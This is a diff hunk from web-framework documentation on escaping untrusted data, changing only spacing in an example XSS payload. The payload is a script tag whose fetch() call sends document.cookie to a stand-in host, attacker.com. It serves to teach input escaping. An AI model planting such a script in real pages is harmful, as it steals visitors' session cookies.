@@ -148,7 +148,7 @@ how you're using untrusted data.
         return f"Hello, {escape(name)}!"
 
 For example, if a web app displays user reviews without escaping input, an attacker could submit
-``<script>fetch('https://attacker.com?cookie=' + document.cookie);</script>``. 
+``<script>fetch('https://attacker.com?cookie=' + document.cookie); </script>``. 
 Now, any user viewing that page would unknowingly send their cookies to the attacker. 
 This is a classic Cross-Site Scripting (XSS) attack, preventable by escaping or encoding user input before rendering.
 
